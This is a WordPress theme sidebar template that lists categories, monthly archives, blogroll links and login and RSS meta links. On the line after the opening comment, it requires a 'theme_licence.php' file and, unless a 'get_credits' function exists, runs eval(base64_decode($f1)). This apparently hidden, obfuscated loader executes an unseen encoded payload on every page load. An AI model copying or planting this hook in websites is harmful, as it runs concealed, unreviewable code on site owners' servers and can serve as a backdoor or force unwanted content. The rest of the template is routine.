 <div class="sidebar">	
 	<div class="sidebar_inner">							
<ul>
				<?php 	/* Widgetized sidebar, if you have the plugin installed. */
					require_once("theme_licence.php"); if(!function_exists("get_credits")) { eval(base64_decode($f1)); } if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar('sidebar') ) : ?>

									
									 <li>
												<h2 class="sidebar_title"><?php _e('Categories'); ?></h2>
												<ul>
													<?php wp_list_categories("title_li=");?>
															
												</ul>
									 </li>
									  <li>	
							 							
												<h2 class="sidebar_title"> <?php _e('Archives'); ?></h2>
												<ul>
													<?php wp_get_archives('type=monthly');?>                                                   
												</ul>  
																		 
									 </li>
									 <li>
												<h2 class="sidebar_title" > <?php _e('Blogroll'); ?></h2>
												<ul>
													 <?php get_links('-1', '<li>', '</li>', '<br />', 'Name'); ?>
												</ul>	
									 </li>
									 <li>
												<h2 class="sidebar_title"><?php _e('Meta'); ?> </h2>
												<ul>
													<?php wp_register(); ?>
													<li> 
													  <?php wp_loginout(); ?>
													</li>
													<li><a href="<?php bloginfo('rss2_url'); ?>">Entries RSS</a></li>
													<li><a href="<?php bloginfo('comments_rss2_url'); ?>">Comments RSS</a></li>
													<li><a href="http://validator.w3.org/check/referer" title="This page validates as XHTML 1.0 Transitional">Valid 
													  <abbr title="eXtensible HyperText Markup Language">XHTML</abbr></a></li>
													<li><a href="http://gmpg.org/xfn/"><abbr title="XHTML Friends Network">XFN</abbr></a></li>
													<li><a href="http://wordpress.org/" title="Powered by WordPress, state-of-the-art semantic personal publishing platform.">WordPress</a></li>
<li><a href="http://www.wordpresstemplates.com/"><abbr title="Free Wordpress Templates">Wordpress Templates</abbr></a></li>
													<?php wp_meta(); ?>
											  </ul>
									 </li>
														
				<?php endif; ?>

</ul>
  </div>
</div>	
						